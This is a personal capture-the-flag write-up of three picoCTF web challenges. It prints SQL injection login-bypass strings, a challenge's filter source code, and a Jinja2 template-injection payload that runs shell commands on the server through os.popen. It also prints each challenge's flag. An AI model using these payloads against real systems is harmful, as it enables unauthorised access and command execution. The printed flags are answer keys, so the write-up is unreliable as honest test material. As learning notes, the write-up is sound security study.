# 1. Web Gauntlet
>Can you beat the filters? Log in as admin:
>http://shape-facility.picoctf.net:64326/
>http://shape-facility.picoctf.net:64326/filter.php
>Hints:
>>  - You are not allowed to login with valid credentials.
>>  - Write down the injections you use in case you lose your progress.
>>  - For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
>>  - sqlite
>>  - If your cookie keeps getting reset, try using a private browser window

## Solution:
- i just use some of the popular sql injections
- for the 1st one i just had to comment out whatever was after admin
- same for the second one but i couldnt use -- so i just used ;
- ; also works for the 3rd one
- we need to concatenate for the 4th one so i used ||
- same || also works for the 5th one as i used || instead of union for the last one

```
SELECT * FROM users WHERE username='admin'--' AND password='sfg'
SELECT * FROM users WHERE username='admin';' AND password='sff'
SELECT * FROM users WHERE username='admin';' AND password='sff'
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='sda'
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='adf'
```
```
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_79a0ddc6}
?>
```

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- sql injection

## Notes:
- note to self: memorise the cheatsheet from the next time

## Resources:
- https://portswigger.net/web-security/sql-injection/cheat-sheet

***

# 2. SSTI1
> I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
http://rescued-float.picoctf.net:62549/

## Solution:
- The hint says that we have to use a technique called server side template injection
- This is a type of vulnerability where a website will render user input as a template of some sort
- I checked what the website was running on using
  ```
    shaunak@Shaunaks-MacBook-Pro ~ % curl -i http://mercury.picoctf.net:21485/
    HTTP/1.1 302 FOUND
    Content-Type: text/html; charset=utf-8
    Content-Length: 209
    Location: http://mercury.picoctf.net:21485/
    Set-Cookie: name=-1; Path=/
    
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
    <title>Redirecting...</title>
    <h1>Redirecting...</h1>
    <p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.%                                                            shaunak@Shaunaks-MacBook-Pro ~ % 
  ```
- so the website is running on python, now i searched for vulnerabilities of ssti for python
- i found a command vulnerability in the web {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
- here whatever you put inside popen is treated as a command
- so i write this in the website
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
- this shows me the list of files and directories
```
__pycache__ app.py flag requirements.txt
```
-then i enter the final command
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
-and it gives off the flag : picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```

## Concepts learnt:
-ssti

## Notes:
- none

## Resources:
- https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/
- https://portswigger.net/web-security/server-side-template-injection
- https://onsecurity.io/article/server-side-template-injection-with-jinja2/

***

# 3. Cookies
> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/

## Solution:
- Here i open the website, and since its about inspecting the cookies, i open the developer tools
- i type in "snickerdoodle" and i see a cookie with value 0
- then i type in 1, it shows oatmeal raisin but that isnt the correct cookie
- then i type 50, i shows invalid
- then i type 30 it shows invalid
- then i type 20 and i see a cookie, that means the correct cookie must be less than 30, so its realistic to just manually type in and check all the cookies
- so i keep on incrementing, it was a boring but nessasary
- at cookie#18 i find the flag
  <img width="1466" height="749" alt="image" src="https://github.com/user-attachments/assets/4d0f1e5b-300d-4d71-9bb7-b4be5e4af70a" />


## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
```

## Concepts learnt:
- how to scan cookies

## Notes:
- none

## Resources:
- none

***
